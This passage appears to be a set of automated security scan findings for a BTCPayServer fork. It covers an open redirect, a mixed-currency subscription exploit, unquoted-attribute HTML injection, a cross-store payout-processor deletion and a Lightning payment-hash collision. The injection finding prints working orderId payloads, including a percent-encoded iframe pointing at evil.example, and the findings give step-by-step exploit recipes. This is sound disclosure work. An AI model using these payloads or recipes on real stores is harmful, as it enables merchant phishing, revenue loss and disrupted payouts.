4. [BTCPayServer/Controllers/UIInvoiceController.cs:201](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L201)
   Stored on the invoice as RedirectURLTemplate with only Trim(); no host restriction.
5. [BTCPayServer/Services/Invoices/InvoiceEntity.cs:496–504](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceEntity.cs#L496-L504)
   RedirectURL getter accepts any absolute http/https URI; only the scheme is checked, any external host passes.
6. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:211–215](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L211-L215)
   Anonymous GET /i/{id}/receipt issues a server-side 302 to the stored URL whenever the store has receipts disabled.
7. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:752–764](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L752-L764)
   Anonymous GET /i/{id} issues a 302 to the stored URL when no checkout model can be built (invoice without payment prompts, e.g. a zero-amount invoice) and receipts are disabled.
8. [BTCPayServer/wwwroot/checkout/checkout.js:186–189](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/checkout/checkout.js#L186-L189)
   In the default configuration the stored URL becomes `storeLink`, rendered as the `Return to <StoreName>` button on the checkout page (Checkout.cshtml:148,182,219) and used for `window.top.location` after settlement when RedirectAutomatically is set (lines 234-242).
9. [BTCPayServer/Views/UIInvoice/InvoiceReceipt.cshtml:192–194](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIInvoice/InvoiceReceipt.cshtml#L192-L194)
   Receipt page (default: enabled) renders the stored URL as the `Return to <StoreName>` link on the trusted domain.

## Impact
Trust in the merchant's payment domain is abused to send users to attacker content (phishing, fake payment pages impersonating the merchant or BTCPay); no server data is read or modified beyond the attacker's own invoice's redirect field.

## Reproduction steps
1. Unauthenticated attacker creates one PoS or crowdfund invoice with an attacker-chosen redirectUrl (a single anonymous POST, rate-limited only to 4/min), then sends victims a link on the BTCPay domain. On stores that disabled receipts (non-default store setting, hence AT:PRESENT) /i/{id}/receipt answers with a server-side 302 to the attacker host; on default stores the attacker URL is presented as the merchant's own `Return to <StoreName>` button on the checkout and receipt pages and is followed automatically after payment when RedirectAutomatically is set. The victim only needs to open the trusted link.

## Recommended fix
An anonymous request parameter on the public PoS and crowdfund POST endpoints is persisted as the invoice's redirect target and later used for server-side redirects and trusted-page links without any restriction to merchant-approved destinations. Fix criteria: Redirect targets originating from anonymous app requests (PoS `redirectUrl`, crowdfund `RedirectUrl`) must be ignored in favour of the store/app configuration or restricted to destinations the merchant controls (same origin as the configured RedirectUrl/StoreWebsite or the BTCPay origin); /i/{id} and /i/{id}/receipt must never 302 to, and checkout/receipt pages must never link to, a host the merchant has not approved. Verify by posting redirectUrl=https://evil.example to a PoS and a crowdfund app and confirming the resulting invoice's checkout, receipt and redirect responses never reference evil.example.

---
**Severity:** LOW
**Status:** Open
**Category:** Open redirect
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257431

---

# Plan migration mixes currencies: new plan price charged against old-plan-currency credit

## Details
Every plan carries its own Currency (PlanData.Currency; set per plan in UIOfferingController.AddPlan line 644 and via GreenfieldOfferingController plan update line 229), and PlanChange links between plans of an offering are created with no currency-equality check (UIOfferingController lines 653-690). Credits are stored per (subscriber, currency) (SubscriberCredit key), but the migration/charging path treats every amount as a bare number in the subscriber's *current* plan's currency:

- SubscriptionHostedService.CreateInvoiceForCheckout (lines 193-199): amount = plan.Price (new plan, in the new plan's currency) - Subscriber.GetCredit() (balance in the old plan's currency) - the old plan's unused-period amount (old currency, for HardMigration). If the result is <= 0 no invoice is created and StartPlanCheckoutWithoutInvoice runs.
- TryStartPlan (lines 540-572) then charges sub.NextPlan.Price through TryChargeSubscriber / TryCreditDebitSubscriber, whose currency defaults to sub.Plan.Currency (SubscriptionContext lines 86-92) - the old plan's currency. The hard-migration branch credits the unused old-plan amount and debits the new plan's numeric price in one old-currency transaction, then StartNextPlan records PaidAmount = plan.Price.
- SubscriberData.GetCredit(currency) (lines 53-54) compares the argument to Plan.Currency instead of the row's currency, so MissingCredit()/payment reminders misreport balances once two currencies exist.

Reachability: a subscriber holding a portal session POSTs command=migrate (HardMigration) or command=pay (SoftMigration) with any changedPlanId (UISubscriberPortalController lines 209-229; the controller is [AllowAnonymous]). CreatePlanMigrationCheckout (lines 712-754) only requires a PlanChange record from the current plan to the target plan; the checkout is then processed via RedirectToPlanCheckoutPayment -> ProceedToSubscribe -> SubscribeRequest -> CreateInvoiceForCheckout with no currency check anywhere on the path. The portal GET explicitly skips the price popup for plan changes whose currency differs (lines 120-124), so cross-currency links were anticipated, yet the server still accepts them.

Exploit (store with plan A priced 5,000 JPY/month and plan B priced 100 USD/month, linked by an A->B plan change): a subscriber active on A early in a period POSTs migrate changedPlanId=B. CreateInvoiceForCheckout computes 100 - 0 - ~5,000 <= 0 and creates no invoice; TryStartPlan's hard-migration branch credits ~5,000 JPY and debits 100 JPY, and StartNextPlan puts the subscriber on B with PaidAmount=100. With any plan-A price, the subscriber can instead buy 1,000 JPY (about 6.5 USD) of credit via add-credit (CreateCreditCheckout invoices in Plan.Currency) and then migrate: 100 - 1,000 <= 0, so B starts after a 100 JPY debit. Either way the subscriber holds the 100 USD/month plan for a few dollars' worth of JPY, keeps the leftover JPY credit, and auto-renewal (UpdateSubscriptionStates line 290, TryChargeSubscriber with NextPlan.Price in Plan.Currency - now B's USD bucket, which GetCredit() reads from the row matching Plan.Currency) continues to charge 100 from whichever bucket matches, never the USD value actually owed.

The precondition is a merchant configuration - plans of different currencies within one offering linked by a plan change - that the product permits in both the UI and the Greenfield API without validation or warning, and that no documentation forbids (docs/users/offerings.md and the subscriptions swagger describe per-plan price/currency and per-currency credit with no single-currency requirement). The finding holds under that condition.

## Evidence
1. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:193–199](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L193-L199)
   Invoice amount for a migration = new plan price (new currency) minus existing credit and unused amount (old plan currency) - numeric subtraction across currencies; <=0 skips the invoice entirely.
2. [BTCPayServer/Plugins/Subscriptions/SubscriptionContext.cs:86–92](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionContext.cs#L86-L92)
   currency defaults to sub.Plan.Currency (the current plan), so charges for a different-currency NextPlan are debited from the wrong currency bucket.
3. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:533–576](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L533-L576)
   TryStartPlan charges sub.NextPlan.Price via TryChargeSubscriber/TryCreditDebitSubscriber without passing the new plan's currency; hard migration credits old-plan unused amount and debits new-plan price in one mixed-currency transaction.
4. [BTCPayServer.Data/Data/Subscriptions/SubscriberData.cs:53–57](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Data/Subscriptions/SubscriberData.cs#L53-L57)
   GetCredit(currency) compares the requested currency to Plan.Currency rather than to each credit row's currency, so balance lookups are wrong whenever more than one currency is involved (MissingCredit uses it).
5. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:712–754](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L712-L754)
   CreatePlanMigrationCheckout validates only that a PlanChange record exists; a different-currency target plan is accepted and becomes a checkout with OnPay from the request.
6. [BTCPayServer/Plugins/Subscriptions/Controllers/UISubscriberPortalController.cs:209–229](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Controllers/UISubscriberPortalController.cs#L209-L229)
   Anonymous portal-session holder chooses changedPlanId and command (migrate=HardMigration, pay=SoftMigration) in the POST body.
7. [BTCPayServer/Plugins/Subscriptions/Controllers/UISubscriberPortalController.cs:120–123](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Controllers/UISubscriberPortalController.cs#L120-L123)
   The UI skips computing a price popup for plan changes whose currency differs, acknowledging the mismatch, yet the server still accepts such migrations.
8. [BTCPayServer/Plugins/Subscriptions/Controllers/UIOfferingController.cs:644–690](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/Controllers/UIOfferingController.cs#L644-L690)
   Context: plan currency is per plan and PlanChange records are created between any two plans of the offering with no currency equality check.

## Impact
Subscription ledger integrity is violated: the subscriber obtains and keeps renewing a higher-value plan for a fraction of its price, and credit history records debits in the wrong currency. The effect is bounded to the attacker's own subscriber record and the merchant's revenue for that subscription; no confidentiality or availability impact.

## Reproduction steps
1. The attacker is an existing subscriber holding a portal session, a customer capability the merchant hands out (docs/users/offerings.md: 'Your service grants access to the portal by creating a temporary portal link'). They POST command=migrate with the id of a plan priced in a stronger currency; the server starts that plan after debiting its numeric price in the cheap currency, optionally after buying a small amount of cheap-currency credit through the same portal. No authentication or authorization control must be defeated; the only requirement is that the merchant has linked plans of different currencies with a plan change, a configuration the product permits without validation (AT:P).

## Recommended fix
1. Charges and invoice amounts for a plan being started are computed from the new plan's numeric price but denominated/debited in the subscriber's current plan currency; credits and unused-period refunds in one currency are subtracted from prices in another. Fix criteria: Every credit, debit and invoice amount must be denominated in the currency of the plan it pays for, and only credit in that same currency may offset it; mixed-currency plan changes must either be rejected server-side (CreatePlanMigrationCheckout and checkout creation) or converted explicitly. Verify by configuring plans in two currencies with a plan change between them and confirming a migration cannot start the target plan without paying its full price in its own currency.
2. SubscriberData.GetCredit(currency) filters credits against Plan.Currency instead of the credit row's currency, returning balances from the wrong currency. Fix criteria: GetCredit(currency) must return only the balance whose row currency equals the requested currency (defaulting to the plan currency when none is given); verify with a subscriber holding credits in two currencies that each lookup returns the matching bucket and MissingCredit() reflects the next plan's own currency.

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect calculation
**CWE:** [CWE-682](https://cwe.mitre.org/data/definitions/682.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257428

---

# Unquoted title attribute in TruncateCenter lets invoice orderId inject HTML attributes

## Details
The TruncateCenter view component writes `data-bs-toggle=tooltip title={Model.Text}` via a Razor `@(...)` expression in attribute position (BTCPayServer/Components/TruncateCenter/Default.cshtml:26). Razor HTML-encodes the expression (`< > & " ' +` and non-ASCII), but the attribute is unquoted and space, `=`, `%`, `:` and `/` are not encoded, so any space in Model.Text ends the title value and the remainder is parsed by the browser as further attributes on the <span>. Whether the text arrives single-encoded or (as string-typed tag-helper attributes may be) double-encoded does not matter: the injection relies only on space and `=`.

BTCPayServer/Views/UIInvoice/ListInvoices.cshtml:237 passes `invoice.OrderId` into the component for every listed invoice with the default padding of 7, so the branch triggers for any orderId longer than 14 characters. OrderId is `invoice.Metadata.OrderId` with no length or character restriction (UIInvoiceController.UI.cs:1127; InvoiceEntity.cs:48-52) and is attacker-authored: the anonymous PoS POST `/apps/{appId}/pos` (no [Authorize]; `orderId` parameter at UIPointOfSaleController.cs:199, stored verbatim at :406 — the PoS embed generator at :646/:658 even documents a hidden `orderId` input), the anonymous pay button (`UIPublicPayButtonController.PayButtonHandle`, `OrderId = model.OrderId`, when the store enabled AnyoneCanInvoice), and Greenfield `POST /api/v1/stores/{storeId}/invoices` with a CanCreateInvoice-only key, all of which flow through `CreateInvoiceCoreRaw` → `InvoiceMetadata.FromJObject(invoice.Metadata)` (UIInvoiceController.cs:170-171).

Exploit (default configuration): create an invoice whose orderId is e.g.
`x style=position:fixed;inset:0;z-index:9999;background:url(https://evil.example/t.png) y`
or
`x data-bs-html=true data-bs-sanitize=false data-bs-title=%22%3Ciframe%20src=https://evil.example/login%3E%3C/iframe%3E%22 y`.
The rendered tag is `<span class="truncate-center-truncated" data-bs-toggle=tooltip title=x style=... y>` / `... data-bs-html=true data-bs-sanitize=false data-bs-title=%22%3Ciframe... y>`. The first payload renders on page load with no interaction (inline styles and images are unrestricted). For the second, site.js:442 runs `$('[data-bs-toggle="tooltip"]').tooltip()`; vendored Bootstrap 5.3.3 (wwwroot/vendor/bootstrap/bootstrap.bundle.min.js) builds the tooltip config from every `data-bs-*` attribute and normalises each value with `JSON.parse(decodeURIComponent(value))`, so the percent-encoded JSON string yields `<iframe src=...></iframe>` as the title without `<`, `>`, `"` or a space ever appearing in the HTML; with `html=true` and `sanitize=false` TemplateFactory._setContent assigns it to `innerHTML` unsanitised when the merchant hovers the truncated order id. (Note: a second `title=` attribute, as in the researcher's original payload, is discarded by the HTML parser — the first attribute wins — which is why `data-bs-title` is the working vector.)

The default AntiXSS CSP (Hosting/Startup.cs:166-167; ContentSecurityPolicyAttribute.cs:20-29) emits only `script-src 'self'` plus hashes — no default-src, frame-src, img-src or style-src — so injected inline event handlers and javascript: URLs are blocked but iframes, images and inline styles are not. Default impact is therefore stored HTML/CSS injection in the authenticated merchant UI (phishing iframe/overlay, UI redress, IP/time tracking via image fetch) against every store member with CanViewInvoices who opens the invoice list. With `--nocsp` or a CSP bypass it becomes full stored XSS in the viewing member's cookie session.

Root cause: an attribute built by string interpolation and emitted unquoted. The same component is used at 29 call sites; other callers with user-controlled Text are tracked by leads outside this record.

## Evidence
1. [BTCPayServer/Components/TruncateCenter/Default.cshtml:26](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Components/TruncateCenter/Default.cshtml#L26)
   When IsTruncated, the component emits `@(Model.IsTruncated ? $"data-bs-toggle=tooltip title={Model.Text}" : "")` inside the <span> start tag. Razor HTML-encodes `< > & " ' +` but the attribute is UNQUOTED and space/`=`/`%` are not encoded, so any space in Model.Text terminates the title value and the rest becomes additional attributes on the span. This is the line the fix must change.
2. [BTCPayServer/Components/TruncateCenter/TruncateCenter.cs:30–33](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Components/TruncateCenter/TruncateCenter.cs#L30-L33)
   Text is passed through unchanged and IsTruncated = text.Length > 2*padding (padding defaults to 7), so any orderId of 15+ characters reaches the unquoted-attribute branch.
3. [BTCPayServer/Views/UIInvoice/ListInvoices.cshtml:237](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIInvoice/ListInvoices.cshtml#L237)
   The cookie-authenticated merchant invoice list (Policies.CanViewInvoices) renders `<vc:truncate-center text="@invoice.OrderId" .../>` for every invoice with the default padding.
4. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:1127](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L1127)
   ListInvoices populates `OrderId = invoice.Metadata.OrderId ?? string.Empty` — the free-form metadata value with no length or character restriction.
5. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:199](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L199)
   The anonymous PoS POST `/apps/{appId}/pos` (no [Authorize] on class or action) binds `orderId` from the request body; it is stored verbatim as `OrderId = orderId ?? AppService.GetRandomOrderId()` at line 406, so an unauthenticated payer controls the injected text.
6. [BTCPayServer/Controllers/UIInvoiceController.cs:170–171](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L170-L171)
   CreateInvoiceCoreRaw stores request metadata with `InvoiceMetadata.FromJObject(invoice.Metadata)` without validating orderId — the common path for PoS, pay button and Greenfield CreateInvoice (GreenfieldInvoiceController.cs:232, CanCreateInvoice-only key).
7. [BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs:73–76](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PayButton/Controllers/UIPublicPayButtonController.cs#L73-L76)
   The anonymous pay button handler (when the store enabled AnyoneCanInvoice) stores the form's OrderId verbatim — a second unauthenticated source.
8. [BTCPayServer/wwwroot/main/site.js:442](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/main/site.js#L442)
   Bootstrap tooltips are initialised globally for `[data-bs-toggle="tooltip"]`, so injected `data-bs-html=true data-bs-sanitize=false data-bs-title=...` attributes are read as tooltip config.
9. [BTCPayServer/wwwroot/vendor/bootstrap/bootstrap.bundle.min.js:6](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/vendor/bootstrap/bootstrap.bundle.min.js#L6)
   Vendored Bootstrap 5.3.3: `getDataAttributes` maps every `data-bs-*` attribute into the component config and normalises values with `JSON.parse(decodeURIComponent(t))`, so a percent-encoded JSON string in `data-bs-title` yields raw `<iframe ...>` markup without `<`, `>`, quotes or spaces in the HTML; with html=true/sanitize=false `_setContent` assigns it to innerHTML unsanitised.
10. [BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs:20–28](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs#L20-L28)
   The default AntiXSS CSP (added globally at Hosting/Startup.cs:166-167 unless --nocsp) sets only `script-src 'self'` — no default-src, frame-src, img-src or style-src — so inline event handlers are blocked but injected iframes, images and inline styles render, limiting default impact to HTML/CSS injection.

## Impact
Under the default CSP the attacker gets stored HTML/CSS injection inside the merchant's authenticated UI: a fixed-position overlay or iframe can impersonate BTCPay pages to phish credentials and mislead the merchant about invoice state (integrity of what the merchant sees), and image fetches leak each viewer's IP address and viewing time to the attacker (minor confidentiality). No availability impact. Account takeover of the viewing member is only reachable if CSP is disabled or bypassed and is not counted in these metrics.

## Reproduction steps
1. Attacker: an anonymous payer on any store exposing a PoS app (or pay button), or any holder of a CanCreateInvoice API key. Delivery: one POST creating an invoice whose orderId (>14 chars) contains a space followed by attribute syntax; no character outside the un-encoded set (space, =, %, :, /) is needed because Bootstrap 5.3.3 percent-decodes and JSON-parses data-bs-* values. Trigger: a store member with CanViewInvoices opens the invoice list — the `style=`/image payload renders on load (passive); the tooltip-HTML payload additionally fires on the routine hover the tooltip invites. Attack requirement: the target store must expose a public invoice-creating surface (PoS/pay button), or the attacker must hold a low-privilege API key. No shipped control must be defeated for HTML/CSS injection; script execution would additionally need a --nocsp deployment or a CSP bypass and is not rated here.

## Recommended fix
1. TruncateCenter/Default.cshtml builds the tooltip attributes by string interpolation and emits them as an unquoted HTML attribute, so HTML encoding does not neutralise spaces/`=` and user text can define new attributes. Fix criteria: Attributes must be emitted through Razor attribute syntax (quoted `title="@Model.Text"`, conditional attributes via tag-helper/`@if`), never by interpolating user text into an unquoted attribute string. Verify by rendering a text containing ` data-bs-html=true data-bs-sanitize=false title=<img> ` and confirming the DOM has exactly one title attribute whose value is the literal string and no extra attributes.
2. Invoice orderId and other free-form metadata are trusted to be attribute-safe when rendered in merchant views; any future unquoted/raw usage reintroduces the issue. Fix criteria: Audit all `vc:truncate-center` call sites and other interpolated attribute strings for user-controlled text; add a test rendering an orderId with spaces, quotes and angle brackets through ListInvoices and asserting no attribute injection.

---
**Severity:** LOW
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257288

---

# Payout processor removal authorizes on route store but deletes processor of any store

## Details
The cookie-UI endpoint POST /stores/{storeId}/payout-processors/{id}/remove (UIPayoutProcessorsController.Remove) is protected by Policies.CanModifyStoreSettings, which BuiltInPermissionScopeProvider.SqlStoreScopeProvider scopes to the {storeId} route value. The {id} route value is not among the RouteValueToStoreIdQuery entries the project uses to cross-check object ids against {storeId} (BTCPayServerServices.cs:510-518), so no store match is enforced by the authorization layer. The handler publishes PayoutProcessorUpdated { Data = null, Id = id } and PayoutProcessorService.RemoveProcessor deletes the PayoutProcessorData row by primary key (context.FindAsync<PayoutProcessorData>(id)) and stops the matching hosted processor. At no point is the processor's StoreId compared with the store the caller is authorized on.

Consequently any authenticated user holding CanModifyStoreSettings on a store they control (trivially, Owner of a self-created store) can delete the automated payout processor (on-chain batch sender or Lightning sender) of an unrelated store by sending the victim store's processor id with their own storeId in the route, using a valid antiforgery token from their own session. The processor id is an EF-generated string key (assumption: with [DatabaseGenerated(Identity)] on a string property, Microsoft.EntityFrameworkCore 10.0.12 assigns a GUID string via StringValueGenerator), so it is not guessable; it is exposed in the victim store's 'Payout Processors' page to members with CanModifyStoreSettings and does not rotate. A current Owner/Manager gains nothing (they may remove it through the sanctioned path); the gain is for a former Owner/Manager whose store access was revoked, who retains the id and can still delete the processor through their own store. The Greenfield equivalent (GreenfieldStorePayoutProcessorsController.RemoveStorePayoutProcessor) performs a store-filtered lookup before removal, so this is specifically a UI-path authorization gap.

Impact: cross-store integrity. The victim store silently loses its automated payout processing (approved payouts are no longer paid automatically until the merchant notices and re-configures). No funds are moved and no data is disclosed.

## Evidence
1. [BTCPayServer/PayoutProcessors/UIPayoutProcessorsController.cs:59–78](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/PayoutProcessors/UIPayoutProcessorsController.cs#L59-L78)
   Remove(storeId, id) is guarded by Policies.CanModifyStoreSettings, which the cookie permission pipeline scopes to the {storeId} route value; the handler then publishes PayoutProcessorUpdated { Data = null, Id = id } carrying only the attacker-supplied processor id. storeId is never compared with the processor's StoreId, so the authorized store and the affected store can differ.
2. [BTCPayServer/PayoutProcessors/PayoutProcessorService.cs:84–92](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/PayoutProcessors/PayoutProcessorService.cs#L84-L92)
   RemoveProcessor(id) loads PayoutProcessorData by primary key alone (context.FindAsync<PayoutProcessorData>(id)), deletes it, saves, and stops the running hosted processor. No store-ownership check exists at this layer either.
3. [BTCPayServer/PayoutProcessors/PayoutProcessorService.cs:175–191](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/PayoutProcessors/PayoutProcessorService.cs#L175-L191)
   ProcessEvent routes a PayoutProcessorUpdated with null Data straight to RemoveProcessor(processorUpdated.Id), so the UI event reaches the unscoped delete unchanged.
4. [BTCPayServer/Hosting/BTCPayServerServices.cs:510–518](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L510-L518)
   The project's shipped cross-check for store-scoped routes is the RouteValueToStoreIdQuery list (appId, payReqId, paymentRequestId, pullPaymentId, payoutId, invoiceId; plugins add webhookId, offeringId, multisigSetupId). BuiltInPermissionScopeProvider.SqlStoreScopeProvider fails authorization when such a route value resolves to a store other than {storeId}. The generic {id} route value used by the payout-processor Remove route is not registered, so this control never runs for it.
5. [BTCPayServer/Controllers/GreenField/GreenfieldStorePayoutProcessorsController.cs:46–73](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldStorePayoutProcessorsController.cs#L46-L73)
   The Greenfield sibling performs removal correctly: it looks the processor up with Stores = [storeId] and only then publishes matched.Id, showing the store scoping the UI endpoint omits.
6. [BTCPayServer/Views/UIPayoutProcessors/ConfigureStorePayoutProcessors.cshtml:49–52](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIPayoutProcessors/ConfigureStorePayoutProcessors.cshtml#L49-L52)
   The processor id is emitted in the Remove link (asp-route-id="@conf.Value.Id") inside a cell gated by permission=CanModifyStoreSettings, so every current Owner/Manager of the victim store learns the identifier; it does not rotate, so a member whose access is later revoked retains it.

## Impact
The victim store's PayoutProcessorData row is deleted and its running hosted processor stopped: a cross-store modification of store configuration limited to one processor row per request, with service disruption of that store's automated payout processing. No disclosure.

## Reproduction steps
1. Attacker is an authenticated non-admin user with CanModifyStoreSettings on a store of their own (obtained by creating a store). They send POST /stores/{attackerStoreId}/payout-processors/{victimProcessorId}/remove with the antiforgery token of their own session; authorization succeeds on their store and RemoveProcessor deletes the victim's row. The one hurdle is knowing the victim's processor id: a non-guessable EF-generated string key (assumed GUID under EF Core 10.0.12) visible only on the victim store's payout-processor page to CanModifyStoreSettings members, which a former Owner/Manager retains after removal from the store.

## Recommended fix
UIPayoutProcessorsController.Remove trusts the {id} route value without verifying that the referenced PayoutProcessorData belongs to the {storeId} the caller is authorized on, and PayoutProcessorService.RemoveProcessor deletes by id alone; the route value name 'id' is also outside the RouteValueToStoreIdQuery cross-check list. Fix criteria: Removal must only succeed when the processor's StoreId equals the authorized store: look the processor up with Stores = [storeId] as the Greenfield endpoint does (or register the route value in the RouteValueToStoreIdQuery cross-check and/or make RemoveProcessor take and enforce a storeId). Verify by issuing the removal from a different store with another store's processor id and confirming 404/403 and that the processor row and hosted service remain.

---
**Severity:** LOW
**Status:** Open
**Category:** IDOR/BOLA
**CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257280

---

# Hostile store's Lightning node can suppress another store's payment via payment-hash key collision

## Details
BTCPay records Lightning payments in the shared `Payments` table whose primary key is (Id, PaymentMethodId) (PaymentData.cs:35-36). For Lightning, `LightningInstanceListener.AddPaymentCore` sets Id to the payment hash taken verbatim from the store's own node notification (`notification.GetPaymentHash`, LightningListener.cs:615-633; LightningExtensions.cs:34-39) - an identifier chosen by whatever backend the store owner configured (LightningLikePaymentHandler.cs:132-142 stores the node's hash unchecked). `PaymentService.AddPayment` converts any `DbUpdateException` on insert into 'already recorded' (returns null, PaymentService.cs:53-64) without checking that the pre-existing row belongs to the same invoice, and `AddPayment` reacts by permanently removing the node invoice from `_ListenedInvoices` (LightningListener.cs:587-593). A restart re-polls (`GetMonitoredInvoices`) and hits the same conflict, so the loss is permanent.

